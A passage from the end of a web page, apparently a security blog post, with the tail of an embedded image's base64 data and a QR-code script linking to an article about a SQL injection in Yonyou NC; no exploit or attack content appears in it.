W5Z9F5fYBqde7z9Uakq91BYy8tAoYdQi3L4TDE+8npE7ug+LwGeLeIFNzmh0hef1i96mLPS83L6508x2LW9MRslcYsWpmYf0st9e6b8Uh113l1QvvJ2R/wh+w3j5DIFNc7QmSh2BNs0J/rSvkEB8EK1fR8/LKVchFSL28PBUQvdYGRNMrmhfVIX4IrvLqHSF1vZ+8I8QPI+599xOyP40PWF8OBDLN1d0BycOI/b3BeV4/xCf3unIY8+qFv+J9xd/7Vc0+zIv7XK0hezUvVm4VlwNZFd76nzmB5UCcpgiZNgTVO7pNdfkKIf3M9zo4z1tXCPFC0F4QXp59wKjr1wNjXl2E5CHY6/WJEJ9chOjA/busx4e9Dk8IPKcFbNt1+qIJ4Otv5eQiRO9+8+qi+u/gqpc6ZE9X14D4rNMP0SFoXtQnF2H06xP1FR4GounG95zA8pt6TauibwsybQiWp0JfrSvkEJ+8I4x5CIdg9aqwDqJ3DtEBU0usfhUaal0BDE87hEOwPBXWQXQ4x+6vHhXqe7yfkP1pfMB6+6ZeE9vHam97T61hfndU7iwgdV4HRm6t+Y7mZ6gXvtfTenvL4byf/o7Wq6946fcTUqfwQbF9hkCmD6+h78Gpi+oipN+Kq6/qr/KQ/oDWJQJfnxEQ1AjhEFztRV20viOkz5UO8cET7yekn9qb+TYQp36Fr+4XMvWV3+v0vDqM9TBy6/QXqomlVcjF0s4Cci0I6oVwGNG+on652HX5HreBWHTje0/gMBAYpw/hq23Ced46iM+7QX2F+iB13QfR4Yh6Ycy9qusTIX3kK4T4YMTuh3X+MJBefPO/ewJ/bCDe4R19e5C7xDyEQ1CfqE+c6V2T/yr2a/R6869ir7eu68X/2ECq+R2/fgL/94E4fZjf6RC9++S+BZj7zHe/eiGMtSuvOsRftRUQbr4jJA/BqtkHRIeg9RCut+vA/fchjw97HZ4Qp9ZxtW99Pa8OuSsgqK5/xdVhrINwOKI9V2hPceVTh1xjxXsfGP3mYdTtN8PDQGamW/t7J7ANBDJFOMerrcFY/6pfH4z1/S6T6/8dhFzLnh3tDfHJRZjr9oF5HqJD0H6F20CK3PH+E7gH8v4ZDDv4HwAAAP//yWNQFQAAAAZJREFUAwC6/hngQP3QKgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ActivityNotice-export-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 